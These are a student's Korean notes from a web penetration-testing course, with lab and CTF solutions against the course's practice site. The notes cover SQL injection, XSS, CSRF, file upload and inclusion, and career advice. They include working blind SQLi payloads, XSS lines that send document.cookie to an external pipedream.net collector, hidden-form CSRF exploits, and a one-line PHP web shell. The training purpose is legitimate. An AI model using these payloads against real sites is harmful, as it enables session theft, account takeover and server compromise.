4주차 수업!!!

<?php
1’ union select column_name, 2 from information_schema.columns WHERE table_name = ‘admin’ #

1' and updatexml(null,concat(0x3a,(select database())),null) and ’1%’=‘1'



Blind SQL Injection / SQL 질의문 결과가 화면에 안나오는 곳

SQL Injection 가능한 모든 곳에 사용 가능
시간이 오래 걸림
자동화 능력이 있어야함 / python


원리
SQL 질의문의 결과가 참과 거짓에 따라 응답이 달라질 때

삽입하는 조건문

트릭
1. Limit [시작위치0], [개수]
	> 데이터가 하나의 행만 추출될 수 있도록 만들어주는 문법

   2. Substring [시작위치1], [개수]
	> 글자를 잘라낼 때 사용(함수)
	substring(‘normaltic’, 1, 1)=‘a’)

   3. ascii
	문자를 숫자로 표현한 코드
	ascii(‘a’) = 39

   4. 2진 탐색 / 업다운게임
	33 ~ 126
http://normaltic.com:7777/BlindSqli/login.php

————————————————————————————————
select pass from member where id=‘normaltic’



‘test’

순서?
1. substring(‘test’, 1, 1)
2. ascii(substring(‘test’, 1, )) > 0
3. ascii(substring((SQL), 1, 1)) > 0
  ascii(substring((select pass from member limit 0, 1), 1, 1)) > 0

‘ and (ascii(substring((select pass from member where id=‘normaltic’),1,1))>100) and ’1%’=‘1


Id > pajji%’ and (조건) and ’1%’=1

‘ and (1=1) and ‘1%’=‘1
‘ and (조건) and ‘1%’=‘1

select * from ~ where user_id like ‘%______%’

?>

step1. SQL 가능 유무 체크

  mario' and '1'='1 / mariosuper

  select ~~ where id='mario' and '1'='1'

step2. Payload 구성 (조건문)

  mario' and (1=2) and '1'='1

step3. database
ascii(substing((select database()), 1, 1))>70
mario' and (ascii(Substring((select database()), 1, 1))>70) and '1'='1



database: sqli_3

step4. table
select table_name from information_schema.tables Where table_schema = ‘DB’ limit 0, 1

mario' and (ascii(substring((select table_name from information_schema.tables where table_schema = ‘sqli_3’ limit 0, 1), 1, 1))>70) and '1'='1

table:

step5. column
mario' and (ascii(substring((select column_name from information_schema.columns Where table_name = ‘Table’ limit 0, 1), 1, 1))>70) and '1'='1


step6. data : segfault{Blind_SQLi_EASY}

python으로 자동화 프로그램 코딩 해보자....!

SQL Injection 훈련
> lord of SQL Injection

- SQL Injection 대응 방안.
  1. Prepared Statement
    미리 컴파일 해버림 / 변수화 / SQL Injection 원천차단
    select * from member where id='__' and pass='__'
    > 01010100101010___0101010101010__10101001001
  - 단, Prepared Statement 가 적용이 안되는 곳이 있으니.
  그 곳은 화이트 리스트 기반 필터링을 한다.

  2. 필터링 or WAF(web application Firewall) 도입
  가) 화이트 리스트 기반 필터링
  나) 블랙 리스트 기반 필터링

- 왜 SQL이 먹힐까?
  1. 옛날에 만든 사이트, 옛날 사람들.
  2. Prepared Statement를 제대로 못쓴다.
  3. Prepared Statement 적용이 안되는 곳 : order by, table 이름, column 이름

4주차 과제
1. 웹개발
2. SQLi 공격 연구 보고서 마무리
3. SQLi 3 문제 풀기!

?>
---------------------------------------------------------------------
5주차 수업

<?php
면접질문

SQL Injection
- What / 무엇인지
> 공격자가 임의의 SQL 쿼리를 삽입해 서버 측에서 실행되는 SQL 쿼리가 공격자의 의도대로 변조되는 공격

- WHERE / 어디에서 발생하는지
> 사용자의 입력값(parameter)을 SQL 질의문에 사용하는 페이지.

- Why / 왜 일어나는지
> 사용자의 입력값을 SQL 질의문에 직접 삽입해서 사용하기 때문에.

- Scenario / 뭘 할 수 있는지
> DB 데이터 추출
> DB 데이터 변조
update, delete, insert
> 인증 우회
> WEB SHELL UPLOAD
- web, was, db가 한 서버에 구축되어있을 경우 가능

- Defense / 어떻게 막는지
(1) Prepared statement
(2) 화이트 리스트 기반 필터링 / Prepared 안먹히는 곳 / order by, table 이름, column 이름

--------------------------------------------------------------------------------

XSS (Cross-Site Scripting): 크사, 크스스
"Java Script 공부!!", DVWA

+ Server Side Script VS Client Side Script(html, "java", css)
alert(1)

개념 : 클라이언트 측 스크립트(Java)를 삽입하는 공격 / (WEB)브라우저
> "공격자의 스크립트가 그대로 서버에서 응답되기 때문"

ex) : <script>session, cookie</script>

발생위치 : 파라미터 데이터가 응답에 포함되는 모든 곳!
> 영원한 우리의 친구? / Reflected XSS

- 스크립트 삽입 전략
1. 서버에 저장 - Stroed XSS
2. 서버에서 반사 - Refelected XSS
3. 클라이언트 조립 - DOM Based XSS

-----------------------------
- Reflected XSS
> 검색기능
스크립트 포함한 링크를 통해 공격 수행
사회공학기법 활용, GET방식이어야 가능 Post에서 전환 불가능시 X

Tip: params 포함, 응답에 입력값 포함되어있는지, 리피터에서 응답위치 확인, 톱니(Auto scroll)
<"'> / <script></script> 필터링 확인, URL 카피"

--------------------------------------------------------
- Dom Based XSS : 클라이언트 측에서 조립
> 서버응답x, 서버저장x
-- document.write(사용자의 파라미터) / url에 삽입?
링크를 통해서 공격 수행

---------------------------------------------------------
XSS - Session ID
> Javascript
-- document.cookie ->

WEB Server
access log

<script>document.write('<img src="http://normaltic.com/?'+document.cookie+'"/>');</script>

<script>alert("Reflected")</script>


"과   제"
1. XSS 복습
- stored XSS, Reflected XSS

Stored XSS : http://normaltic.com:1018/xss_1/notice_update.php?id=178
Relfected XSS : http://normaltic.com:1018/xss_2/notice_update.php?id=60"/><script>alert('XSS')</script>

alert('XSS')

2. 웹 개발

3. 보고서

다음시간
1. XSS 실전 해킹 - 여러가지 시나리오
2. CTF - Session ID 탈취 방법

 ?>


 ---------------------------------------------------------------------
 6주차 수업
	초봉: 3000 전후

<?php
1. Stored XSS
	- HTML, DB

2. Reflected XSS
	- Link (URL)
	* 공격 링크를 만들어라!

3. DOM Based XSS
	- 클라이언트 측에서 조립! / 잘 안나옴 / 찾기 힘듦
	- document.write() / html, js 응답 분석

- XSS Point : alert(1)



-- XSS 필터링 우회
1. Client Side 검증
> 필터링을 js로 구현 / burp 인터셉트나, 개발자 Elements 코드 조작

2. Black List 키워드 필터링
(1) 대소문자 혼합 : Script
(2) 키워드 반복 : <scrsctiptipt>alert(1):</scrscriptipt>
-- xss without script, braket, quort

3. Event Handler
> 클릭, 화면에 띄워졌을 때, 마우스가 올라갔을 때, 에러가 났을때...

<img src=~~~ onerror="alert('xss')">

onmouseover
onactivate
onload
<audio src="음악 파일 경로" onplay="alert(1);" autoplay;>

div, object, svg

* 예상 외 xss 포인트
<script> 안에 있을 수도

value에 입력값이 들어갈때
<input name="title" value="pajji" onfocus="alert(1)" auto focus>

----------------------------
* 공격 시나리오
1. Session 탈취
</div><script>document.wirte('<img src="+document.cookie"/>');</script><div>
<script>alert(document.cookie)</script>
"><script>alert(document.cookie)</script>"

2. HTML Injection

3. Key Logger 삽입
javascript keylogger

4. Miner 실행 / 영상시청 사이트
> javascript(xss) miner : 메모리 점유율

5. Redirect (Phishing)
<script>location.href="https://22222.com";</script>
<script>location.replace("https://22222.com";)</script>

-------------------------------------------------
* 대응 방안
> HTML 특수 문자를 HTML Entity 치환

예외) HTML Editor
> 에디터를 쓰지말자.. / 써야한다면..
1. 사용자 입력에서 모든 HTML 특수 문자들을 HTML Entity로 치환
2. 허용할 Tag, 화이트리스트 기반으로 허용할 태그들을 다시 복구
3. 스크립트 실행이 가능한(제한해야할) Event Handler 블랙 리스트 기반으로 필터링

---------------------------------------------------

XSS CTF
Session 탈취
VPS

<script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script>



XSS
_ alert('xss');

* 과제
1. normaltic.com XSS 문제 풀이
1번 : http://normaltic.com:1018/xss_1/notice_read.php?id=52&view=1
flag :

2번 : http://normaltic.com:1018/xss_2/notice_list.php?option_val=username&board_result=aaa');location.replace("https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie);('&board_search=%F0%9F%94%8D&date_from=&date_to=
flag :

3번 : http://normaltic.com:1018/xss_3/mypage.php?user=%22/%3E%3Cscript%3Elocation.href=%22https://eoky46j4rt0f4na.m.pipedream.net/?%22%2bdocument.cookie;%3C/script%3E
flag : segfault{XSS_Is_Mirror}

4번(xss_5) : http://normaltic.com:1018/xss_5/notice_read.php?id=2&view=1
flag :

5번(xss_7) : http://normaltic.com:1018/xss_7/notice_update.php?id=42
</textarea><script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script> <textarea>
정답
http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234

flag :

6번(xss_6) : http://normaltic.com:1018/xss_6/notice_update.php?id=66
flag :

2. XSS 공격 연구 보고서


제목 : 답안 제출
내용 : 공격 URL



------------------------------------------------
1. 사고 안치는 사람
2. 친밀한 사람?? 사교적인
3. 꼼꼼함.

<img src=x onmouseover="alert('xss')">


 ?>




------------------------------------------------------
7주차 수업
<?php
자격증
1. 정보보안기사
2. OSCP
> 침투테스트 (pentest)

* 모의해킹
- 웹 해킹 프로젝트
- 모바일 앱 해킹 프로젝트 / 안드로이드, ios
- 침투테스트 프로젝트
- OA 침투 + 와이파이 해킹


---------------------------------------------------------

* CSRF VS XSS ??
> 피해자가 의도치 않게 웹 서버로 특정 요청을 하게 만드는 공격!

"내 비밀번호를 1234로 바꿔줘"

xss : 클라이언트 측 공격
csrf : 서버 측 공격

why??
- 공격자가 요청을 예측하고 만들 수 있어서!

> 링크를 못 만들게 한다.
> 기존 비밀번호를 적으면 url에 포함되어 공격자가 pw를 몰라서 공격을 못하게 된다.

> POST 방식이면 csrf 단독 공격 안된다.

* POST Method
> CSRF + XSS

1. 무언가 바뀌어지는 페이지
2. 바꾸는 요청 확인
3. 입력값 위치 확인
4. GET방식으로 전환
5. POST 방식일 때 (xss 활용)
- 다른 게시판에 form 태그 활용 method 변경

--------------기본형식-------------------

<form method="POST" action="url">
	<input type="hidden" name="email" value="변경">
	<input type="submit" value="Click Me">
</form>

-------------자동실행(document.forms)----------------

<form method="POST" action="-">
	<input type="hidden" name="email" value="pajji@test.com">
</form>
<script>
      document.forms[0].submit();
</script>
-------------버튼 가리기(iframe), 페이지 이동 강제(body onload)----------------


<iframe style="visibility:hidden;display:none" name="stealthframe">
</iframe>

<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="url" target="stealthframe">
	<input type="hidden" name="email" value="example@test.com">
</form>
<script>
	document.forms[0].submit();
</script>
http://normaltic.com:1018/xss_7/notice_list.php

----------------post 일때 위 코드 사용-----------------
* 과제

1. GET Credential (xss_7)
-> XSS 찾기! update 아님..
http://normaltic.com:1018/xss_7/login.php?id=1}');alert(1);('&pw=1234
http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234

2. CSRF
- 개념 정리
"https//portswigger.net/web-security/csrf/lab-no-defenses"
(post mothod, 자동 전송, 스텥스폼)
- 게시판 : 글쓰기, 마이페이지(비밀번호 바꾸기 csrf)

3. 웹 개발

?>

-----------------------------------------------------------------------
8주차 수업
<?php
> 해킹대회 참여해봐라!
- CTF "flag"
- Bug Bounty

> 해킹 컨퍼런스
- Codegate
컴퓨터 관련 컨퍼런스 참여 경험
------------------------------------------------------------------------
SQL Injection > 서버 측 공격(서버에게 공격을 날린다.)

XSS / CSRF > 클라이언트 측 공격(클라이언트에게 공격을 날린다.): 사이트 이용자가 있어야한다.

\ : escape 문자 뒷글자(특수문자)를 그냥 문자로 인식
\' : 문자그대로의 '로 인식

-------------------------------------------------------------------------
* CSRF 공격
> 피해자가 자신도 모르게 서버로 임의의 요청을 하게 만드는 공격
ex) "비밀번호 바꿔줘!", "이메일 주소 바꿔줘!", "게시글 작성해!" 등

GET / POST
GET 요청 : 파라미터가 URL에 포함
- "나 비밀번호 1234로 바꿔줘!"
> http://akdajsdkaskdk.com

XSS
<img src="http://sdasdasd.com">

--------------------------------------------------------------------------
* CSRF 공방
post로 바꾸면 되겠네!
> xss
<form>

</form>

- Referrer 헤더 검증 / Referrer를 지워버리면 끝??
> 하위 호환

만약, refeter 헤더가 있으면 검사!
없으면, 넘어가자!

레퍼러 삭제 코드
<meta name="referrer" content="no-referrer">

CSRF 토큰
> 랜덤한 값.
>> xss가 있으면 값을 가져올 수 있다..

>> 인증정보 추가
ex) pw파라미터 등...
?>

인증

- CSRF Token 값 가져오는 코드

<iframe id="getCSRFToken" src="http://adas.com/mypage.php" width=

<script>
function exploit() {
	var token = document.gerElemenById("getCSRFaToken").contentDocument

}
</script>



CSRF part 1 / http://normaltic.com:7777/csrf_1/notice_read.php?id=154&view=1
<body onload="location.href='http://normaltic.com:7777/csrf_1/mypage_update.php?id=&info=&pw=1234'";>


CSRF Part 2 / http://normaltic.com:7777/csrf_2/notice_update.php?id=40&view=1
<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
</iframe>
<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
	<input type="hidden" name="pw" value="1234">
</form>
------------------------------
<script>
	document.forms[0].submit();
</script>

CSRF Part 3 / http://normaltic.com:7777/csrf_3/notice_update.php?id=89&view=1
내 답
<meta name="referrer" content="no-referrer">
<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
</iframe>
<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
	<input type="hidden" name="pw" value="1234">
</form>

-정답-
<iframe id="getCSRFToken" src="http://normaltic.com:7777/csrf_3/mypage.php" width="0" height="0" border="0" onload="exploit()"></iframe>

<iframe width="0" height="0" border="0" name="stealthframe" id="stealthframe" style="display: none;"></iframe>

<script>
function exploit() {
     var token = document.getElementById("getCSRFToken").contentDocument.forms[0].csrf_token.value;

     var ch_pass = '1234';
     document.writeln('<form width="0" height="0" border="0" method="post" action="http://normaltic.com:7777/csrf_3/mypage_update.php" target="stealthframe">');
    document.writeln('<input type="hidden" name="pw" value="' + ch_pass + '" /><br />');
    document.writeln('<input type="hidden" name="csrf_token" value="' + token + '" />');
     document.writeln('<input type="submit" name="submit" value="Exploit" /><br/>');
     document.writeln('</form>');
     document.forms[0].submit.click();
}
</script>



과제
1) CSRF 문제 1, 2
2) CSRF 연구 보고서 작성
3) 웹 개발
4) CSRF 문제 풀이 3

<script>
var csrf_token = $("#csrf_token").html();
alert(csrf_token);
</script>
.
.
<html>
  <!-- CSRF PoC - Burp Suite Professional에서 생성 -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<body onload="document.csrf_form.submit();">
    <form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_3/mypage_update.php">
      <input type="hidden" name="pw" value="1234"/>
      <input type="hidden" name="csrf_token" value=MD5(document.cookie) />
			<meta name="referrer" content="no-referrer">
    </form>
  </body>
</html>


RE111590460NL
-------------------------------------------------------------
9주차 수업
<?
<File Upload>
> 공격자가 원하는 임의의 파일을 업로드 할 수 있는 취약점

- 발생 가능위치
> 파일을 업로드하는 곳

- 공격 시나리오 / 구체적 방안까지 생각
(1) 서버 측 실행 파일 업로드
> RCE -> 서버 장악 (Webshell)

(2) Deface 공격
> 웹 루트에서 메인 페이지 변조

(3) 디도스
> 대용량 파일 업로드

* Web SHELL / url을 활용하여 파일 실행 요청
> 서버에 임의의 명령을 내릴 수 있는 서버 측 실행 파일

- 1줄 web shell, 1구화목마
<?php echo system($_GET['cmd']); ?>

// Command (ls, id, ifconfig...)

system('ls')

webshell.php?cmd=id

* 내가 올린 webshell을 실행하는 방법
> 우리가 올린 파일이 어디있는지
find / -name // "" 2> /dev/null

- 대놓고 php, jsp, asp 파일이 올라가는 곳 별로 없다.

- 우회 Bypass가 필수적
1) 파일 검증 우회
* Content Type MIME
jpg로 바꿔라

2) 확장자 검증
.php .jsp 만 검증 할때

우회 확장자 사용
.phtml, .php3, .php5, .jspx
.pHp>
webshell.php%00.jpg(윈도우 서버에서만 가능)

3) 서버측 파일 오버라이드 =/ 오버리딩
.htaccess
AddType application/x-httpd-php .normaltic

webshell.normaltic

4) File Signature / hex : Hex Editor 활용
확장자별 고유 HEX 마지막에 코드 삽입
> moon.jpg 를 .php로 바꿔서 올린다
앞부분 jpg 시그니쳐만 확인해서 그냥 php로 코드가 실행이 된다.

5) 파일 업로드 다른 Method : PUT
PUT / webshell.php
request body에 코드 작성

6) 개발자의 실수 + 클라이언트 측 검증

- 과제
1) 파일 업로드 공격 정리
2) File Upload 1,2번째 문제 풀이
3) 웹 개발 & 보고서

https://ctftime.org/

?>
-------------------------------------------------------------
10주차 수업
<?php
필터링!
- 업로드 되지 않는다.

1. 클라이언트 측 필터링
> 이용자들의 편의!

2. 서버측 필터링 (검증코드)
: 잘못구현.

실패하면 > 파일을 저장x, 파일 업로드 받아서는 X

+ 로그인
실패 시 > 다른 페이지로 리다이렉트

---------------------------------------------------------------------------
파일 업로드

if(파일 검사 코드){
~~~
}

- 내가 올린 파일 어디에 어떻게 저장되는지 / 정상파일을 먼저 올려보자
ex) http:~~~~/files/pajji/pajji.png

(1) 이미지 파일 웹쉘
.php
서버측 실행 파일의 확장자만!!! 실행할 수 있다!

.jpg, .png 실행가능?>
<?php

특정조건에 따라서
> 다른 취약점.

> File Inclusion 취약점
- LFI : Local File Include
- RFI : Remote File Include
urlPath=http:~~~~~/webshell.txt
?>
> <?php ehco ~~ ?>
<<?php
include($_GET['urlPath']);

--- 웹개발 : include
> 취약점

include('사용자의 파라미터')

??lang=en.php

page=/etc/passwd (해당파일이 있다면 가져옮)
-----------------------------------------------------------------------
- File Include 핵심
* 서버에 있는 원하는 파일을 확인할 수 있다.

> 소스코드를 볼 수 없다.. / was에서 php를 실행해버림
> php 코드를 실행한다.
> 그림파일 마지막에 php(webshell)코드를 포함하여 file upload 시키고, include, 명령어를 실행해본다.
?>
> ../../files/pajji.png&<?php echo system($_GET['cmd']); ?>
<?php
* 파일 Include 취약점
> 파일 업로드 기능이 없어도 가능하다
 ?>
- GET/<?php echo system($_GET['cmd']); ?>
> RCE 가능
<?php
access.log > 접근 로그
웹 서버로 들어오는 로그

http://normaltic.com:9023/lfi_1/files/%eb%b0%95%ec%a7%80%ec%99%84/webshell.png

include("./lang/" .$_GET['lang']);
* 디렉토리 트레버져
./lang/../../../../../../etc/passwd

 ?>

-----------------------------------------------------------------------
<?php
> File Download 취약점
> 서버에 있는 임의의 파일을 다운로드 취약점
** 파일 다운로드 종류
1) 직접 접근 > 인가

2) 다운로드 스크립트 작성
download.php?filePath=파일 경로

http://normaltic.com:3184/download_1/download.php?filePath=/../../../../../password.txt

> 서버에 있는 모든 파일을 공격자가 가져갈 수 있다.
?>
/서버 측 소스코드
login.php
<?php
	include('./db.php');
	include('./top.php');

	db_connect();
?>
<?php
소스코드 받아야하는 이유!
1. 주석 코드
2. 취약점 찾기 위해서

- 소스코드
> DB 연결 정보



> DB 계정 비밀번호
1) 파일 다운로드 취약점을 찾고
2) DB 계정 비밀번호 찾아서 DM 보내기
?>
<?php
--------------------------------------------------------------------------
11주차 : 인증 / 인가

--------------------------------------------------------------------------
12주차
첫 회사를 대기업을 가라?
* SK 쉴더스
* 시큐아이
지식정보보안 컨설팅 전문업체(28개 회사) / 1차 회사
- https://www.isac.or.kr/sub/02/main_business

* 첫 회사 선택 기준
- 연봉(3000~3100 이상은 받아야한다??)2천 이하는 아깝다.. < 스펙 (모의해킹 프로젝트 투입 여부)
- 실력 향상! / 나한테 알려주는 사람은 없다. / 스스로 공부할 수 있는 곳 찾아가자
- 프로필
---------------------------------------------------------------------------
* 인증 / 인가 취약점
- 1번문제
회원 가입 시
Step1. 약관 동의
Step2. 본인 인증
Step3. 회원 가입

* 회원가입을 정상적으로 한 번 해본다.
Step1.php -> agree.php
Step2.php -> auth.php
Step3.php -> register.php

* 아이디 찾기
이름 :
전화번호 : 010-xxxx-xxxx
          [확인]

- 2번문제
html 주석처리 안에 숨어있는것들이 있다
- 숨겨진 기능 (글쓰기, 수정, 검색) / 검색기능 SQLi 있을때 주석으로 없애도 그대로 취약할수도
- 관리자 페이지, 세션Id

현재 페이지에서 함수 선언이 안보일때

* Javascript 추적
- <script src="~~.js"> / 자바스크립트를 현재 페이지에서 실행 (= php include)

함수이름 검색 시켜놓고 URL 쭉 탐색 / Burp

+ js 안뜨는 경우
1. Burp 필터링 세팅
2. 웹 브라우저 캐시(삭제) / 새로고침 오른쪽 마우스 클릭(캐시비우기, 강력새로고침)
3. Not modified / [Burp] Proxy-Options-Match and Replace / If-Modified-Since, If-None-Match 체크

* Client 인증
- 비밀글 보기
- 다른 사람 글 수정

- 4번문제
js 난독화 / js.beautyfy??

* E2E(end to end) 암호화

- 5번문제
guessing / php 페이지 이름 추측

일할때 자동화 프로그램 절대 쓰지마라 책임진다..
파이썬 자동화 파일은 가능

* 글 데이터 로드 위치
1) 글 읽기
2) 글 수정
3) 글 미리보기 (리스트 페이지)

* 인증 / 인가 대응 방안
> 서버의 세션을 통한 검증 / 서버에서 잘 검사해라
> 서버측 검증 코드 구현

* 취약점에 대한 항목 분류 고민하지 말고 새로운 항목으로 보고해라
------------------------------------------------------------------
1. SQL Injection

2. XSS

3. CSRF

4. File Upload / Donwload

5. Auth (인증 / 인가)

-------------------
모의해킹 프로젝트 2개월

매주 1개 이상 사이트  / 모의해킹 결과 보고서(진짜 중요 포트폴리오) - 리뷰

* 웹 개발 페이지 / normalticpublic@gmail.com
(1) 웹 소스코드 파일 php파일 / 압축
(2) DB 파일 -> sql 파일 추출


?>

---------------------------------------------------------------------------
<?php
13주차 (실무위주 강의)
공격 원리 / 공격 시나리오 / 공격 대응방안: 공격방법 기본 5가지는 꼭 마스터

업무 Process
1. 협의
[프로젝트 투입 전] / 적으면서 체크하자
(1) 고객사 컨택 포인트 or PM 연락처
(2) 투입 전 체크리스트
- 고객사 위치 (대부분 서울 혹은 판교, 양재)
- 출퇴근 시간 (회사마다 다름)
- 투입 날짜에 어디에서 언제까지 가야하는지
- 노트북 반입 여부(필수)
	1. 가능
		> 포맷해서갈까요?? 프로그램 세팅해서 갈까요??
		 - 진단프로그램 반입 방법 확인 / USB or Mail
	2. 불가능
		> 진단프로그램 반입 방법 확인 / USB or Mail
--------------------------------------------------------------
[모의해킹 필수 프로그램] / 카톡 등 사적 프로그램 설치하지 마라!
- Burp Suite : Web Proxy Tool
- Wireshark : Network Packet Dump / http 네트워크 평문 패킷 검증
- Atom, SubLime Text : Text Editor
- HxD : Hex Editor
- SSLyzer : SSL 점검
- Python
- DBeaver : SQL Viewer
--------------------------------------------------------------
[프로젝트 투입 시 첫 날]
- 복장: 정장, 깔끔 / 사무실 분위기를 보자 / 오픈을 앞둔 좀비 개발자가 있을수도
- 협의 사항
> 대상 수령(엑셀) / 계속 일이 생길 수 있으니 픽스하잔
> 대상에 부여된 테스트 계정 발급/관리자 계정 발급(요청)
> 접속 이상여부 확인

> 점검 기준 : 금취분평 or KISA 주통기반 or 회사 자체 기준
> 산출물 : 결과 보고서, 위험평가 등.. / 데드라인
> 일정 (WBS) (1인분 기준) / 평균 1개 : 2~3일 / 바쁘면 자세하게 못 봐준다
2개 : 1일 -> 불가능하다고 말해라.. / 일정 or 개수를 조정해라
1개 : 1일
1개 : 1주일(5일) / 이상적인!
- 마지막주는 작업시간에 포함시키지 마라 / 보고서 제출, 수정, 발표, 철수 준비도 해야된다.

⭐️⭐️주의해야하는 점 물어보기⭐️⭐️

---------------------------------------------------
> 첫 날은 보통 환경세팅하는데 시간 다 쓴다. / 일정제외 반영
⭐️ 회사나 주변 좀 돌아다녀봐라(꿀팁) ⭐️
⭐️ 프로젝트 끝나기 2주전에 휴가 쓴다고 얘기해라 ⭐️

프로젝트 끝나고 다시 투입하는 중간에 쉬는게 좋은게 아니다
내 포트폴리오를 계속 채워나가야된다.

2. 모의해킹 업무
> 모의해킹 시 서비스에 영향이 가지 않도록 신경쓰는게 가장 중요하다!
* 주의해야할 점
> SQL Injection : Update, Delete, Insert
> SQL Injection : or 랑 주석은 웬만하면 쓰지마라 / 1' and () and '1'='1

조회 / 이러면 모든 데이터가 응답될 수도 있다. / or '1'='1' #

> 스캐너 X (Burp Suite pro)
?>

> File Upload 시 Web Shell 업로드 금지
<?php
	echo "Test";
?>
<?php
이런거 해보고 담당자한테 더 물어봐라

테스트서버도 맘대로 하지마라 / 스캐너 쓸 생각하지마라 / 전문인력을 부른 이유가 있다.

> Burp Log 기능 활성화
고객사가 이상한 것 같다?? 버프 Logger를 항상 저장하자

> 다른 이용자 데이터 건들지마라

> 누구나 보는 곳에서 XSS는 onmouseover 같은 이벤트 핸들러 혹은 console.log 사용 / alert 쓰지마라

* 결과보고서
> 표지 : 날짜(제출날짜) / 버전(고객사 제출은 v1.0)
> 목차 : 오른쪽 마우스 > 필드업데이트 > 전체 업데이트
- 오타나 완성도에 신경을 많이 쓰자 / 내용의 신빙성이 흔들린다
> 개요 : 키워드만 넣어서
- 연락처 : 이메일주소를 넣어라 / 폰번호 넣으면 힘들어진다...

> 총평 : 컨설팅의 결과
> 결과요약 : 보안담당자가 본다.
> 상세내용 : 개발자들이 본다.
	- 보안권고안 : 현재 페이지의 실질적인 대응방안
> 보안권고안 : 일반적인 이론성 내용

- 사이트 한 번 살펴보면서 취약점 파악해보고 그 다음 기준에 맞춰보면서 누락한거를 추가로 찾자
- 버퍼 오버플로우랑, 포맷스트링은 안나온다... 형식적인 기준

해킹할 사이트 : http://normaltic.com:9991/login.php
제출기한 : 1.11(수) / 리뷰준비(연습)

* 과제
1. 웹 모의해킹 프로젝트
2. 결과보고서 & 리뷰 준비
3. 웹 개발
4. + 리뷰 준비

?>
----------------------------------------------------
14주차
<?php
정보누출: 오류 메세지 상 아파치 버전 노출
버퍼오버플로우: 게시물 작성 시 과도한 문자 노출 시 오류
불충분한 인가: 타인의 게시물 수정 및 삭제
파일업로드, 다운로드...:
세션 고정 취약점

총평을 1페이지~2페이지 작성 / 제일 중요함 / 문단 형식 구성으로 작성 / 시간 많으면 공격시나리오 이쁘게ㅋㅋ

----------------------------------------------------
프로젝트
1. 서비스 분석
- 로그인
: 로그인 우회 / 회원가입 안하고 게시물 어떻게 쓰지?, 다른 사람 계정으로 어떻게 들어가지?
2. 목표 세우기
3. 취약점 찾기
4. 점검 기준 항목으로 취약점 찾기 마무리

-----------------------------------------------------
보고서 작성 세부사항
- 문서 양식의 정리
- 단어 통일
- 웹사이트 이동 경로나 기타 설명들을 아주 자세하게 작성해놓자 / 그래야 a/s 연락이 안온다...ㅋㅋ
- 데이터 암호화, 평문 전송 확인은 와이어샤크로 확인 해야한다 / 버프는 다 해석해서 의미가 없다.

* 정보누출 / 웬만하면 다 있다.
> 서버와 관련된 정보! / 버전 정보, 모듈 정보, 플러그인, 라이브러리
> 개발자 서버 주소, 관리자 페이지 주소 정보, 에러페이지
> 응답에 서버 헤더에 버전 정보도 정보 누출이다.
- 커스텀 에러 페이지를 따로 만들거나 에러메시지를 가려나

- tip: 없는 페이지(404), 없는 Method(500), OPTIONS Method에서 허용 메소드 찾고 미허용 메소드 작성(405)


XSS 취약점 보고서 작성법  / 이부분 영상 다시보기!!!
1. Stored XSS
- From URL: 게시물 작성 위치
- Process URL: 실제 게시물 저장 단계 + params

2. Refelected XSS
- URL + params / poc코드 첨부(실제 공격 링크)
3. DOM XSS

* 버퍼 오버플로우 : 원격 코드 실행이 목적이다.
> php, jsp 일반적인 상황에서 일어날리가... 99.99999% 없다...
> c 언어에서 일어난다.
변수별 사이즈를 따로 정하기 때문에 그 사이즈를 넘어가면 다른 변수에 침범하게 된다.
에러가 나오는 상태면 살아있는것 / 진짜 문제면 웹서버가 뻗어버린다.

* 불충분한 인가
- 다른 사람 글 삭제 : url ~~(params)
- 다른 사람 글 수정 : url ~~(params)
- 다른 사람 정보 조회 : url ~~(params)

* 파일 업로드
.htaccess 파일 php_flag_engine off / 업로드는 정상이나 php 실행을 막고 있음.
우회: .htaccess 파일을 다시 올려서 engine을 on으로 하면 php 실행 가능

* 불충분한 세션 만료
- 로그아웃이 세션이 파기되지 않을 시

* 보안대책: 한 번씩 읽어보고 말이되게 작성하자

- 취약점을 찾았다!
* 증적 사진 관리
> 폴더별, 취약점별

인가 : 내가 원래 못하는 걸 하면
인증 :

* 운영체제 명령어 실행 : 웹 외부에서 명령어를 실행하고 불러오는 상황에서 일어난다 / 실제로 거의없다...
* 위치 공개 : 예측 가능한 폴더 / 뻔한 디렉터리 이름 / guessing 공격
* 디렉터리 인덱싱 : Index of / 파일목록

- 주통기반 항목별 공부해보자 / 이해 / 취약점인 이유
- 보고서만 보고 위험도 파악이 될정도로 작성해야한다.

- Propared Statement 확인법 : 특수문자가 그대로 서버로 간다 / 근데 작동을 안한다 / 추측
- sql문 노출 시 확인

* 과제
1. 주통기반 항목 공부
2. 모의해킹 프로젝트 : 결과 보고서 작성 (리뷰 준비)

?>

WAF우회 : 한계치 넘겨서 경로 작성


노말틱님! 어제 잠깐 소개하셨던 프로젝트에서
아마존 코그니토의 취약점 같은 경우는 클라이언트 입장에서는 아예 외부 서비스를 이용하는건데
대응방안 설명시에는 뭐라고 해야되나요?

현재 이용 서비스를 바꾸는거는 너무 큰 일인 것 같고,
회사에서 직접 대응을 할 수는 없는 영역인 것 같아서요..


노말틱님 질문이 몇 가지 더 있는데요..ㅎㅎ
얼마전에 사이버작전사령부에 강의 다녀오셨잖아요
혹시 회사 다니실때도 군 관련기관에 프로젝트를 하러 가신적이 있나요?
그리고 현재 정보보안 전문업체에서 군 기관을 컨설팅하는 그런 사업도 있나요?

이런 분야도 있다면 당장에는 면접에 나중에는 제 커리어에도 적용하고 싶어서요.



노말틱님! 오늘 자꾸 귀찮게해드려 죄송해요..

회사지원 같은경우는 지금 상태에서도 가능성이 있는걸까요?
지금 공고가 떴는데 기다리다가 기회를 놓칠 수도 있을까봐요..

